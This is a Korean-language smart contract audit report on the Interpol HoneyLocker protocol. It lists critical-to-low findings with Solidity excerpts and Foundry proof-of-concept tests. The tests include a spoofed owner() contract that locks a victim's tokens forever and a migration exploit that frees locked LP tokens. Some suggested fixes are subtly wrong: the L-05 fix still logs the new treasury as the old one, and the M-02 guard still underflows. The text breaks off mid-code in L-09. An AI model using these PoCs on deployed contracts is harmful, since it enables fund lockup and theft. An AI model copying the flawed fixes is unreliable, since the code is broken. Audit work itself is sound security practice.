# 소개 (About)

Pashov Audit Group은 업계 최고의 스마트 계약 보안 연구원 팀 여러 개로 구성되어 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만들기 위해 노력합니다. 100% 보안을 보장하는 것은 불가능하지만, 귀하의 블록체인 프로토콜을 위해 숙련된 연구원들의 최선의 노력을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락해 주세요.

# 면책 조항 (Disclaimer)

스마트 계약 보안 검토는 취약점의 완벽한 부재를 보장할 수 없습니다. 이는 시간, 리소스 및 전문 지식이 제한된 노력으로, 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장하거나 검토가 스마트 계약의 모든 문제를 발견할 것이라고 보장할 수 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개 (Introduction)

**Pashov Audit Group**에 의해 **0xHoneyJar/interpol** 저장소에 대한 시간 제한 보안 검토가 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# Interpol 정보 (About Interpol)

InterPol은 사용자가 가능한 보상을 포기하지 않고 기간에 관계없이 유동성을 잠글 수 있도록 하는 프로토콜입니다.

# 위험 분류 (Risk Classification)

| 심각도 (Severity) | 영향: 높음 (High) | 영향: 중간 (Medium) | 영향: 낮음 (Low) |
| ----------------- | ----------------- | ------------------- | ---------------- |
| **가능성: 높음** | 치명적 (Critical) | 높음 (High) | 중간 (Medium) |
| **가능성: 중간** | 높음 (High) | 중간 (Medium) | 낮음 (Low) |
| **가능성: 낮음** | 중간 (Medium) | 낮음 (Low) | 낮음 (Low) |

## 영향 (Impact)

- 높음 (High) - 프로토콜 자산의 상당한 손실을 초래하거나 사용자 그룹에 심각한 피해를 줍니다.

- 중간 (Medium) - 프로토콜 자산의 적당한 손실을 초래하거나 사용자 그룹에 적당한 피해를 줍니다.

- 낮음 (Low) - 프로토콜 자산의 경미한 손실을 초래하거나 소규모 사용자 그룹에 피해를 줍니다.

## 가능성 (Likelihood)

- 높음 (High) - 온체인 조건을 모방한 합리적인 가정으로 공격 경로가 가능하며, 공격 비용이 훔치거나 잃을 수 있는 자금의 양에 비해 상대적으로 낮습니다.

- 중간 (Medium) - 조건부로 동기가 부여된 공격 벡터이지만 여전히 비교적 가능성이 있습니다.

- 낮음 (Low) - 가정이 너무 많거나 가능성이 낮거나 공격자가 거의 또는 전혀 인센티브 없이 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치 (Action required for severity levels)

- 치명적 (Critical) - 가능한 한 빨리 수정해야 합니다 (이미 배포된 경우).

- 높음 (High) - 수정해야 합니다 (아직 배포되지 않은 경우 배포 전).

- 중간 (Medium) - 수정해야 합니다.

- 낮음 (Low) - 수정할 수 있습니다.

# 보안 평가 요약 (Security Assessment Summary)

_검토 커밋 해시_ - [dafe92ea1ad300d566a65743bfed4dbdd8e96427](https://github.com/0xHoneyJar/interpol/tree/dafe92ea1ad300d566a65743bfed4dbdd8e96427)

_수정 검토 커밋 해시_ - [149c27ba331c4945a8e78cb1b4c2d66dc3470dc1](https://github.com/0xHoneyJar/interpol/tree/149c27ba331c4945a8e78cb1b4c2d66dc3470dc1)

### 범위 (Scope)

다음 스마트 계약이 감사 범위에 포함되었습니다:

- `HoneyLocker`
- `HoneyQueen`
- `TokenReceiver`
- `SetAndForgetFactory`
- `Beekeper`
- `LockerFactory`

# 발견 사항 (Findings)

# [C-01] 공격자가 모든 HoneyLocker에 대해 토큰을 영구적으로 잠글 수 있음 (Adversary can lock tokens forever for any HoneyLocker)

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

`HoneyLocker`의 `onlyOwnerOrMigratingVault` 수정자에 `owner() != Ownable(msg.sender).owner()`라는 취약한 확인이 있습니다.

이것의 문제는 공격자가 HoneyLocker의 현재 소유자를 반환하고 이 확인을 우회하는 `owner()` 함수를 구현하는 악성 계약을 생성할 수 있다는 것입니다.

```solidity
modifier onlyOwnerOrMigratingVault() {
    if (msg.sender != owner() && owner() != Ownable(msg.sender).owner()) revert Unauthorized();
    _;
}
```

이 수정자는 `depositAndLock()` 함수를 보호하는 데 사용됩니다. 따라서 공격자는 가능한 가장 큰 `_expiration` 값을 설정하여 이를 호출할 수 있으며, 만료되지 않으므로 합법적인 소유자가 토큰을 인출하는 것을 불가능하게 만들 수 있습니다.

### 개념 증명 (Proof of Concept)

이 테스트는 공격자가 어떻게 만료를 수정하고 최대값으로 설정할 수 있는지 보여줍니다.

피해자는 나중에 토큰을 인출할 수 없게 되는데, 토큰이 만료되지 않기 때문입니다.

- `ExpirationAttacker` 계약을 `test/HoneyLocker.t.sol`에 복사합니다.
- `test_depositExpirationAttack` 테스트를 `HoneyLockerTest` 테스트 내부의 `test/HoneyLocker.t.sol`에 복사합니다.
- `forge test --mt test_depositExpirationAttack` 실행

```solidity
contract ExpirationAttacker {
    address immutable victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function owner() external returns (address) {
        return victim;
    }
}
```

```solidity
function test_depositExpirationAttack() external prankAsTHJ {
    ExpirationAttacker attacker = new ExpirationAttacker(THJ);

    vm.stopPrank();
    vm.startPrank(address(attacker));

    assertEq(honeyLocker.expirations(address(HONEYBERA_LP)), 0);

    uint256 maxExpiration = type(uint256).max;
    honeyLocker.depositAndLock(address(HONEYBERA_LP), 0, maxExpiration);

    assertEq(honeyLocker.expirations(address(HONEYBERA_LP)), maxExpiration);
}
```

## 권장 사항

가능한 해결책 중 하나는 `HoneyLocker` 소유자가 `depositAndLock()`을 호출할 수 있는 특정 "마이그레이션 금고(Migration Vault)"를 설정하는 함수를 추가하고 그에 따라 `onlyOwnerOrMigratingVault()` 수정자를 업데이트하는 것입니다.

# [H-01] 차단된 ERC20 토큰을 여전히 인출할 수 있음 (Blocked ERC20 tokens can still be withdrawn)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

일부 ERC20 토큰은 `onlyUnblockedTokens` 수정자를 사용하여 계약에서 차단될 것으로 예상되며 소유자는 이를 인출할 수 없어야 합니다. 이것이 `withdrawERC20()`에 대해 이 확인이 구현된 이유입니다:

```solidity
function withdrawERC20(address _token, uint256 _amount) external onlyUnblockedTokens(_token) onlyOwner { ... }

modifier onlyUnblockedTokens(address _token) {
    if (!unlocked && HONEY_QUEEN.isTokenBlocked(_token)) revert TokenBlocked();
    _;
}
```

문제는 `withdrawLPToken()` 함수를 통해 이러한 ERC20 토큰을 인출할 수 있다는 것입니다:

```solidity
function withdrawLPToken(address _LPToken, uint256 _amount) external onlyOwner {
    if (expirations[_LPToken] == 0) revert HasToBeLPToken();
    if (block.timestamp < expirations[_LPToken]) revert NotExpiredYet();

    ERC20(_LPToken).transfer(msg.sender, _amount);
}
```

이 함수는 LP가 아닌 토큰이 인출되는 것을 방지하기 위해 `expirations[_LPToken] == 0` 확인을 구현하지만, 토큰, 0 금액 및 과거 만료로 `depositAndLock()`을 호출하여 이 예상을 깨뜨릴 수 있습니다:

```solidity
function depositAndLock(address _LPToken, uint256 _amountOrId, uint256 _expiration) external onlyOwnerOrMigratingVault {
    if (!unlocked && expirations[_LPToken] != 0 && _expiration < expirations[_LPToken]) {
        revert ExpirationNotMatching();
    }
    expirations[_LPToken] = unlocked ? 1 : _expiration;

    ERC721(_LPToken).transferFrom(msg.sender, address(this), _amountOrId);
}
```

이런 식으로 계약 소유자는 0이 아닌 과거 `expirations[_LPToken]` 값을 설정할 수 있습니다. 이를 통해 차단된 토큰을 인출할 수 있습니다.

## 권장 사항

해당 토큰을 예치하고 잠그는 것을 허용하지만 인출하지 않도록 하려는 것인지, 아니면 예치 및 잠금을 아예 방지하려는 것인지에 따라 `withdrawLPToken()` 또는 `depositAndLock()`에 `onlyUnblockedTokens` 수정자를 구현하십시오.

# [H-02] BGT 및 보상 토큰을 수수료 지불 없이 인출할 수 있음 (BGT and reward tokens can be withdrawn without paying fees)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

일부 토큰은 `HoneyLocker` 계약에 의해 보유될 것으로 예상되며 인출 시 수수료를 지불해야 합니다. BGT 토큰 및 기타 보상 토큰의 경우가 그렇습니다.

이를 위해 `withdrawBERA()` 및 `withdrawERC20()` 토큰에 수수료가 구현됩니다.

문제는 `withdrawLPToken()` 함수를 통해 이러한 ERC20 토큰을 인출할 수 있다는 것입니다:

```solidity
function withdrawLPToken(address _LPToken, uint256 _amount) external onlyOwner {
    if (expirations[_LPToken] == 0) revert HasToBeLPToken();
    if (block.timestamp < expirations[_LPToken]) revert NotExpiredYet();

    ERC20(_LPToken).transfer(msg.sender, _amount);
}
```

이 함수는 LP가 아닌 토큰이 인출되는 것을 방지하기 위해 `expirations[_LPToken] == 0` 확인을 구현하지만, 토큰, 0 금액 및 과거 만료로 `depositAndLock()`을 호출하여 이 예상을 깨뜨릴 수 있습니다:

```solidity
function depositAndLock(address _LPToken, uint256 _amountOrId, uint256 _expiration) external onlyOwnerOrMigratingVault {
    if (!unlocked && expirations[_LPToken] != 0 && _expiration < expirations[_LPToken]) {
        revert ExpirationNotMatching();
    }
    expirations[_LPToken] = unlocked ? 1 : _expiration;

    ERC721(_LPToken).transferFrom(msg.sender, address(this), _amountOrId);
}
```

이런 식으로 계약 소유자는 0이 아닌 과거 `expirations[_LPToken]` 값을 설정할 수 있습니다. 이를 통해 `withdrawLPToken()`을 통해 수수료를 지불하지 않고 토큰을 인출할 수 있습니다.

## 권장 사항

`withdrawLPToken()`의 `expirations[_LPToken] == 0` 확인은 LP가 아닌 토큰이 인출되는 것을 방지하기에 충분하지 않습니다.

토큰이 BGT 토큰이 아님을 확인하는 것이 효과적입니다. 그러나 LP가 아닌 토큰을 인출하는 것을 방지하거나 사실상 LP 토큰만 `depositAndLock()`을 통해 예치되도록 허용하려면 또 다른 화이트리스트 확인이 필요합니다. 이러한 옵션 중 어느 것이든 작동해야 합니다.

# [H-03] 마이그레이션 중에 잠긴 모든 LP 토큰을 인출할 수 있음 (All locked LP tokens can be withdrawn during a migration)

## 심각도

**영향:** 높음 (High)

**가능성:** 중간 (Medium)

## 설명

HoneyLocker 마이그레이션은 계약의 코드 해시를 기반으로 승인됩니다:

```solidity
function migrate(address[] calldata _LPTokens, uint256[] calldata _amountsOrIds ,address payable _newHoneyLocker) external onlyOwner {
    // check migration is authorized based on codehashes
    if (!HONEY_QUEEN.isMigrationEnabled(address(this).codehash, _newHoneyLocker.codehash)) {
        revert MigrationNotEnabled();
    }

    ...
}
```

문제는 함수가 동일한 초기화된 값을 가진 다른 HoneyLocker로 마이그레이션될 것이라고 가정한다는 것입니다.

그러나 `unlocked`, `HONEY_QUEEN`, `referral`에 대해 다른 값으로 새 `HoneyLocker`를 생성하는 것이 가능합니다.

이로 인해 많은 영향이 발생할 수 있습니다. 가장 두드러진 것은 만료 시간까지 잠겨 있어야 했던 모든 LP 토큰을 인출할 수 있는 가능성입니다.

사용자가 제공한 악성 HoneyQueen 계약을 감안할 때 다른 공격도 수행될 수 있습니다.

### 개념 증명 (Proof of Concept)

이 테스트는 잠금 해제된 HoneyLocker로 마이그레이션하여 잠긴 토큰 중 일부를 인출하는 방법을 보여줍니다.

- 테스트를 `test/HoneyLocker.t.sol`에 복사합니다.
- `forge test --mt test_migrationExploit` 실행

```solidity
function test_migrationExploit() external prankAsTHJ {
    // LEGIT SETUP

    // deposit first some into contract
    uint256 balance = HONEYBERA_LP.balanceOf(THJ);
    HONEYBERA_LP.approve(address(honeyLocker), balance);
    honeyLocker.depositAndLock(address(HONEYBERA_LP), balance, expiration);

    // clone it
    HoneyLockerV2 honeyLockerV2 = new HoneyLockerV2();
    honeyLockerV2.initialize(THJ, address(honeyQueen), referral, false);

    // set hashcode in honeyqueen then attempt migration
    honeyQueen.setMigrationFlag(true, address(honeyLocker).codehash, address(honeyLockerV2).codehash);

    // CREATE A NEW LOCKER, INITIALIZE IT WITH MALICIOUS DATA AND MIGRATE TO IT
    HoneyLockerV2 maliciousLocker = new HoneyLockerV2();
    address maliciousHoneyQueen = makeAddr("MALICIOUS_HONEY_QUEEN");
    address anotherReferral = makeAddr("ANOTHER_REFERRAL");
    bool unlocked = true;
    maliciousLocker.initialize(THJ, address(maliciousHoneyQueen), anotherReferral, unlocked);

    honeyLocker.migrate(SLA.addresses(address(HONEYBERA_LP)), SLA.uint256s(balance), payable(address(maliciousLocker)));
    assertEq(HONEYBERA_LP.balanceOf(address(maliciousLocker)), balance);

    // The malicious owner got back their tokens
    maliciousLocker.withdrawLPToken(address(HONEYBERA_LP), balance);
    assertEq(HONEYBERA_LP.balanceOf(THJ), balance);
}
```

## 권장 사항

이를 완화하는 한 가지 가능한 방법은 `unlocked`, `HONEY_QUEEN`, `referral` 값이 두 잠금 모두에서 동일한지 확인하는 추가 검사를 추가하는 것입니다.

# [M-01] `isTargetContractAllowed` 함수는 항상 true를 반환함 (Function `isTargetContractAllowed` always returns true)

## 심각도

**영향:** 높음 (High)

**가능성:** 낮음 (Low)

## 설명

`isTargetContractAllowed` 함수는 결함이 있으며 EVM에 메모리 문자열이 저장되는 방식 때문에 항상 true를 반환합니다.

```solidity
    function isTargetContractAllowed(address _target) public view returns (bool allowed) {
        string memory protocol = protocolOfTarget[_target];
        assembly {
            allowed := not(iszero(protocol))
        }
    }
```

다음은 PoC로 Chisel에 붙여넣을 수 있는 코드 스니펫입니다:

```solidity
➜ string memory protocol;
➜ bool allowed;
➜ assembly { allowed := not(iszero(protocol)) }
```

이제 문자열이 비어 있어도 `allowed` 값이 항상 true임을 확인할 수 있습니다:

```solidity
➜ allowed
Type: bool
└ Value: true
```

이 문제의 근본 원인은 EVM의 메모리에 문자열이 저장되는 방식입니다. 이 함수는 인라인 어셈블리를 사용하여 메모리 포인터를 평가하여 문자열이 비어 있는지 확인합니다. 그러나 Solidity에서 문자열에 대한 메모리 포인터는 일단 할당되면 문자열의 내용에 관계없이 항상 0이 아닙니다. 따라서 어셈블리 코드의 `not(iszero(protocol))` 조건은 문자열이 비어 있는 경우에도 모든 경우에 대해 잘못되게 true를 반환합니다.

현재 `isSelectorAllowedForTarget` 함수가 `HoneyLocker`가 승인되지 않은 계약과 상호 작용하는 것을 효과적으로 방지하기 때문에 이 문제의 영향은 미미합니다. 그러나 결함이 있는 함수가 향후 구현에서 활용된다면 로커 소유자는 유동성 잠금을 완전히 우회하고 수수료 지불을 피할 수 있습니다.

## 권장 사항

이 문제를 해결하려면 문자열이 비어 있는지 여부를 확인하는 다른 방법을 사용하는 것이 좋습니다:

```diff
    function isTargetContractAllowed(address _target) public view returns (bool allowed) {
        string memory protocol = protocolOfTarget[_target];
-       assembly {
-           allowed := not(iszero(protocol))
-       }
+       allowed = bytes(protocol).length > 0
    }
```

그리고 Chisel을 사용하여 수정 사항이 올바르게 작동하는지 확인할 수 있습니다:

```solidity
➜ string memory protocol;
➜ bool allowed = bytes(protocol).length > 0;
➜ allowed
Type: bool
└ Value: false

```

# [M-02] `HoneyLocker.unstake()`가 언더플로우로 이어질 수 있음 (`HoneyLocker.unstake()` can possibly lead to underflow)

## 심각도

**영향:** 높음 (High)

**가능성:** 낮음 (Low)

## 설명

테스트 파일에서 HoneyLocker는 Kodiak 스테이킹 계약의 `stakeLocked()` 및 `withdrawLockedAll()` 함수와 상호 작용합니다.

Kodiak 스테이킹 계약에서 `withdrawLockedAll()`이 호출되었지만 만료 날짜가 아직 되지 않은 경우, 함수는 단순히 `get_rewards()`를 호출하고 `_withdrawLocked()`를 건너뜁니다.

```
function withdrawLockedAll() nonReentrant withdrawalsNotPaused public {
>       _getReward(msg.sender, msg.sender);
        LockedStake[] memory locks = lockedStakes[msg.sender];
        for(uint256 i = 0; i < locks.length; i++) {
>           if(locks[i].liquidity > 0 && block.timestamp >= locks[i].ending_timestamp){
                _withdrawLocked(msg.sender, msg.sender, locks[i].kek_id, false);
            }
        }
    }
```

HoneyLocker.unstake 함수에서 `staked[_LPToken][_stakingContract]` 값이 차감됩니다.

```
  function unstake(address _LPToken, address _stakingContract, uint256 _amount, bytes memory _data)
        public
        onlyOwner
        onlyAllowedTargetContract(_stakingContract)
        onlyAllowedSelector(_stakingContract, "unstake", _data)
    {
>       staked[_LPToken][_stakingContract] -= _amount;
        (bool success,) = _stakingContract.call(_data);
        if (!success) revert UnstakeFailed();

        emit Unstaked(_stakingContract, _LPToken, _amount);
    }
```

소유자가 30일 동안 100 LP 토큰을 스테이킹하고 `staked[_LPToken][_stakingContract]`가 100e18이라고 가정해 보겠습니다.

- 100 LP 토큰은 이제 Kodiak 스테이킹 내부에 있습니다.
- 15일 후 소유자가 `withdrawLockedAll()`을 함수 선택자로 사용하여 `unstake()`를 호출합니다.
- 함수는 KDK 보상을 수집하지만 만료가 되지 않았으므로 LP 토큰은 HoneyLocker로 다시 전송되지 않습니다.
- `HoneyLocker.unstake()` 함수에서 `staked[_LPToken][_stakingContract]`는 이제 0이 되지만 LP 토큰은 여전히 Kodiak 계약에 있습니다.
- 15일 후 소유자가 LP 토큰을 인출하기 위해 `unstake()`를 다시 호출합니다.
- `unstake()` 함수는 `staked[_LPToken][_stakingContract]`에서 차감을 시도하기 때문에 언더플로우로 인해 되돌려집니다.

100 LP 토큰은 Kodiak 스테이킹 계약에 갇히게 됩니다.

## 권장 사항

```diff
-   staked[_LPToken][_stakingContract] -= _amount;
+   if (_amount >= staked[_LPToken][_stakingContract]) {
+       staked[_LPToken][_stakingContract] -= _amount;
+   }
```

# [M-03] 라운딩으로 인해 사용자가 프로토콜 수수료 지불을 피할 수 있음 (Users can avoid paying fees to the protocol due to rounding)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`HoneyLocker` 소유자가 `withdrawERC20` 또는 `withdrawBERA` 메서드를 통해 자금 인출을 시작할 때, 추천인과 재무부 모두에게 수수료를 지불해야 합니다. 그러나 소유자는 EVM의 내림(rounding down)을 악용하여 수수료를 전혀 지불하지 않을 수 있습니다. 문제의 근본 원인은 `HoneyQueen::computeFees`에 있습니다:

```solidity
uint256 public fees = 200; // in bps
// ...
function computeFees(uint256 amount) public view returns (uint256) {
    return (amount * fees) / 10000;
}
```

이를 악용하기 위해 소유자는 매우 적은 배치로 자금을 인출할 수 있습니다. 예를 들어 소유자가 1,000,000 토큰을 인출하려는 경우 49 토큰만 인출하도록 반복적으로 요청할 수 있습니다. 명목 수수료율이 2%인 경우 계산된 수수료가 0으로 내림되어야 하기 때문에 이 특정 금액이 선택됩니다:

```solidity
49 * 200 / 10000 = 0
```

이 공격은 필요한 가스 수수료가 이익을 초과할 수 있기 때문에 대부분의 토큰에 대해 비용 효율적이지 않습니다. 그러나 트랜잭션 비용에 비해 라운딩 손실이 더 큰 소수점 자릿수가 적은 고가치 토큰의 경우 실행 가능할 수 있습니다.

## 권장 사항

이 문제를 완화하기 위해 두 가지 솔루션이 제안됩니다:

1. `computeFees`의 수수료 계산을 항상 올림하도록 수정하여 인출이 완전히 무료가 되지 않도록 합니다.
2. 인출 금액에 관계없이 계산된 수수료가 0이 되지 않도록 최소 수수료 임계값을 설정합니다.

# [L-01] Solady safeTransfer 함수의 코드 확인 누락 (Missing code check in Solady safeTransfer functions)

`Beekeper`의 `distributeFees()` 함수는 Solady의 `safeTransfer` 확장을 사용합니다.

문제는 토큰 코드 크기를 확인하지 않으며 EOA에 대한 호출에 대해 되돌리지 않는다는 것입니다.

즉, 실제로 토큰을 전송하지 않고 토큰 분배를 시뮬레이션할 수 있습니다.

공격자가 주소를 알고 있는 아직 존재하지 않는 토큰에 대해 이 작업을 수행할 수 있습니다. 그런 다음 `distributeFees()`를 수행하고 유효한 미래 토큰에 대해 가짜 `FeesDistributed` 이벤트를 방출할 수 있습니다.

## 권장 사항

분배하기 전에 토큰의 코드 크기를 확인하십시오.

# [L-02] 일관성 없는 LP 토큰 전송 (Inconsistent transfer of LP tokens)

`HoneyLocker`의 `depositAndLock()` 함수는 반환 값을 기대하지 않고 사용된 토큰이 반환하지 않아도 되돌리지 않으므로 ERC721 인터페이스를 사용합니다.

```solidity
    function depositAndLock(address _LPToken, uint256 _amountOrId, uint256 _expiration) external onlyOwnerOrMigratingVault {
        ...

        // using transferFrom from ERC721 because same signature for ERC20
        // with the difference that ERC721 doesn't expect a return value
        ERC721(_LPToken).transferFrom(msg.sender, address(this), _amountOrId);

        ...
    }
```

반면 `withdrawLPToken()`은 ERC20 `transfer()` 인터페이스를 사용합니다:

```solidity
function withdrawLPToken(address _LPToken, uint256 _amount) external onlyOwner {
    ...
    ERC20(_LPToken).transfer(msg.sender, _amount);
}
```

따라서 LP 토큰이 `transferFrom()` 함수에서 값을 반환하지 않는 경우 예치할 수는 있지만 인출할 수는 없습니다.

## 권장 사항

일관성을 위해 그리고 잠긴 토큰의 가능성을 방지하기 위해 `depositAndLock()` 및 `withdrawLPToken()` 함수에 `safeTransfer` 및 `safeTransferFrom` 확장을 사용하는 것이 좋습니다.

`withdrawERC20()`에 대해서도 동일한 작업을 수행하여 다른 가능한 수신된 ERC20 토큰이 잠기지 않도록 하는 것을 고려하십시오.

Solady의 `SafeTransferLib`를 사용하는 경우 확장 기능이 계약의 코드 크기를 확인하지 않으므로 해당 확인도 추가해야 함을 명심하십시오.

# [L-03] ERC721 safeTransferFrom 사용 권장 (Recommended use of ERC721 safeTransferFrom)

`HoneyLocker`의 `withdrawERC721()` 함수는 `.transferFrom(address, address, uint256)`을 사용합니다:

```solidity
function withdrawERC721(address _token, uint256 _id) external onlyUnblockedTokens(_token) onlyOwner {
    ERC721(_token).transferFrom(address(this), msg.sender, _id);
}
```

이로 인해 두 가지 문제가 발생할 수 있습니다:

- 호출자가 예상되는 NFT 전송에 반응하지 못할 수 있습니다. 콜백이 수행되지 않기 때문입니다.
- 일부 ERC20 토큰은 `msg.sender`가 토큰 소유자인 경우 허용량을 줄이지 않습니다. 이러한 경우 `transferFrom(address, address, uint256)`은 ERC20 및 ERC721에 대해 동일한 서명을 공유하므로 다른 제한 없이 해당 토큰을 잠금에서 전송할 수 있습니다.

## 권장 사항

ERC721 `safeTransferFrom(address, address, uint256)` 함수를 사용하십시오. 이렇게 하면 콜백이 수행되고 이 경로를 통해 ERC20을 전송할 수 없습니다.

# [L-04] 허용된 모든 계약에 대해 빈 호출을 수행할 수 있음 (Empty calls can be made to any of the allowed contracts)

`onlyAllowedSelector` 수정자를 우회하여 데이터 없이 허용된 모든 계약을 호출할 수 있습니다.

수정자는 `mload(add(_data, 32))`를 통해 예상 선택자를 확인하지만 `_data` 길이가 0이 아닌지 확인하지 않습니다.

```solidity
modifier onlyAllowedSelector(address _stakingContract, string memory action, bytes memory _data) {
    bytes4 selector;
    assembly {
        selector := mload(add(_data, 32))
    }
    if (!HONEY_QUEEN.isSelectorAllowedForTarget(selector, action, _stakingContract)) {
        revert SelectorNotAllowed();
    }
    _;
}
```

따라서 빈 `_data = ""`를 전달하고 함수에 전달된 `calldata` 끝에 예상 선택자를 추가할 수 있습니다.

예를 들어 `wildcard()` 함수의 경우 다음과 같이 호출할 수 있습니다:

```solidity
bytes4 finalizeRedeemSelector = bytes4(keccak256("finalizeRedeem(uint256)"));

bytes memory extendedData = abi.encodePacked(
    abi.encodeWithSignature("wildcard(address,bytes)", address(xKDK), ""),
    abi.encode(finalizeRedeemSelector)
)

(bool ok,) = address(honeyLocker).call(extendedData);
require(ok);
```

따라서 `selector := mload(add(_data, 32))`는 화이트리스트 선택자를 읽지만 함수는 빈 `.call("")`을 만듭니다.

```solidity
function wildcard(address _contract, bytes calldata _data) onlyAllowedSelector(_contract, "wildcard", _data) ... {
    (bool success,) = _contract.call(_data); // @audit `.call("")`
    if (!success) revert WildcardFailed();
}
```

대상 계약에 `fallback()` 또는 지불 불가능한 `receive()`가 있는 경우 실행이 성공합니다(대상이 EOA인 경우에도 가능성은 낮음).

이것은 `stake()`, `unstake()`, `wildcard()`, `claimRewards()` 함수 중 어디에서나 발생할 수 있습니다. `stake()` 함수는 대상 계약에서 사용하지 않을 수 있는 토큰을 승인하므로 가장 문제가 될 수 있습니다. 또한 `staked` 저장 변수를 늘리고 오해의 소지가 있는 이벤트를 방출합니다.

## 권장 사항

`_data.length >= 4`인지 확인하십시오.

# [L-05] HoneyQueen이 이벤트에서 잘못된 이전 값을 방출함 (HoneyQueen emits wrong old values in events)

`HoneyQueen` 계약에 대한 새 값을 설정할 때 이전 속성에 대해 잘못된 값이 방출됩니다.

예를 들어:

```solidity
function setTreasury(address _treasury) external onlyOwner {
    treasury = _treasury;
    emit TreasurySet(treasury, _treasury);
}
```

이벤트를 방출하기 전에 `treasury`에 `_treasury`가 할당됩니다. 따라서 두 변수 모두 `TreasurySet`에서 동일한 값을 보유합니다. 기본적으로 이전 값은 손실됩니다.

이것은 다음 함수들에 대해 발생합니다:

- `setTreasury()`
- `setFees()`
- `setValidator()`
- `setAutomaton()`

## 권장 사항

그에 따라 이전 값을 기록하십시오. 다음은 제안된 구현입니다:

```solidity
function setTreasury(address _treasury) external onlyOwner {
    address oldTreasury = _treasury;
    treasury = _treasury;
    emit TreasurySet(oldTreasury, _treasury);
}
```

# [L-06] `stake`/`unstake`에서 Calldata 인수가 확인되지 않음 (Calldata arguments are not checked on `stake`/`unstake`)

`HoneyLocker` 소유자가 스테이킹하거나 언스테이킹하려고 할 때 스테이킹 또는 언스테이킹 작업을 완료하는 트랜잭션을 실행하기 위해 `_data`라는 인수가 전달됩니다.

해당 `_data` 인수에서 선택자만 `onlyAllowedSelector` 수정자에서 확인되지만 나머지 데이터는 전혀 확인되지 않습니다. 이를 통해 소유자는 프로토콜에서 스테이킹/언스테이킹하고 수신자로 다른 주소를 설정하여 `expirations` 매핑을 우회할 수 있습니다.

현재 Interpol과 통합된 프로토콜에는 `msg.sender`와 다른 수신자를 설정하는 기능이 없지만 defi에서는 이 패턴을 비교적 흔하게 볼 수 있습니다. 예를 들어 [Aave](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/pool/Pool.sol)에서는 `msg.sender`와 다른 주소로 자금을 공급하고 인출할 수 있습니다:

```solidity
  function supply(
    address asset,
    uint256 amount,
  address onBehalfOf,
    uint16 referralCode
  ) public virtual override {
// ...
  function withdraw(
    address asset,
    uint256 amount,
  address to
  ) public virtual override returns (uint256) {
```

미래에 Interpol이 이 기능을 제공하는 프로토콜을 통합하면 이 문제는 악용 가능하게 되며 `HoneyLocker` 소유자가 LP 토큰 잠금(`expirations` 매핑)을 완전히 우회할 수 있습니다.

# [L-07] HoneyLocker.sol에서 언스테이킹할 때 승인을 취소해야 함 (Approvals should be revoked when unstaking in HoneyLocker.sol)

`HoneyLocker.stake()`에서 함수는 임의의 금액으로 스테이킹 계약을 승인합니다.

```
function stake(address _LPToken, address _stakingContract, uint256 _amount, bytes memory _data)
        external
        onlyOwner
        onlyAllowedTargetContract(_stakingContract)
        onlyAllowedSelector(_stakingContract, "stake", _data)
    {
        staked[_LPToken][_stakingContract] += _amount;
 >      ERC20(_LPToken).approve(address(_stakingContract), _amount);
```

언스테이킹할 때 승인이 무효화되지 않습니다.

```
  function unstake(address _LPToken, address _stakingContract, uint256 _amount, bytes memory _data)
        public
        onlyOwner
        onlyAllowedTargetContract(_stakingContract)
        onlyAllowedSelector(_stakingContract, "unstake", _data)
    {
        staked[_LPToken][_stakingContract] -= _amount;
        (bool success,) = _stakingContract.call(_data);
        if (!success) revert UnstakeFailed();
```

HoneyLocker 계약에서 스테이킹 계약이 승인을 유지하지 않도록 승인을 0으로 설정하십시오. 또한 스테이킹 함수에서 승인이 작동하기 위해 0 승인이 필요한 토큰의 경우 모범 사례를 위해 금액을 승인하기 전에 먼저 0으로 승인하는 것이 좋습니다.

```
ERC20(_LPToken).approve(address(_stakingContract), 0);
```

# [L-08] 추천인이 아닌 계정에 대한 수수료 공유 반환 (Returning the fee share for an account that is not a referrer)

Beekeeper.sol에서 getter 함수 `referrerFeeShare()`는 추천인이 아닌 주소에 대해 `standardReferrerFeeShare`를 반환합니다. 대신 0을 반환해야 합니다.

```
    /// @notice Returns the fee share for a given referrer
    /// @dev If a custom fee share is set for the referrer, it returns that value.
    ///      Otherwise, it returns the standard referrer fee share.
    /// @param _referrer The address of the referrer
    /// @return The fee share for the referrer in basis points (bps)
    function referrerFeeShare(address _referrer) public view returns (uint256) {
>       return _referrerFeeShare[_referrer] != 0 ? _referrerFeeShare[_referrer] : standardReferrerFeeShare;
    }
```

# [L-09] 계약당 스테이킹된 토큰의 양이 인위적으로 부풀려질 수 있음 (The amount of tokens staked per contract can be artificially inflated)

HoneyLocker.sol에서 `stake()`를 호출할 때 함수는 `_amount`를 받아 `staked` 매핑에 추가합니다. 그런 다음 함수는 `_data` 매개변수로 `_stakingContract`를 호출합니다.

```solidity
function stake(address _LPToken, address _stakingContract, uint256 _amount, bytes memory _data)
        external
        onlyOwner
        onlyAllowedTargetContract(_stakingContract)
        onlyAllowedSelector(_stakingContract, "stake", _data)
    {
>       staked[_LPToken][_stakingContract] += _amount;
        ERC20(_LPToken).approve(address(_stakingContract), _amount);
>       (bool success,) = _stakingContract.call(_data);
        if (!success) revert StakeFailed();

        emit Staked(_stakingContract, _LPToken, _amount);
    }
```

`_amount`는 실제로 스테이킹 계약으로 전송되는 금액과 다를 수 있습니다. 소유자는 실제로 스테이킹 계약으로 전송되는 LP 토큰이 1e18인 동안 `_amount`를 임의의 큰 금액으로 설정할 수 있습니다.

테스트 계약에서 소유자는 `_amount`를 10000e50으로 설정하고 1e18 `HONEYBERA_LP`만 스테이킹할 수 있습니다.

```solidity
        honeyLocker.stake(
            address(HONEYBERA_LP),
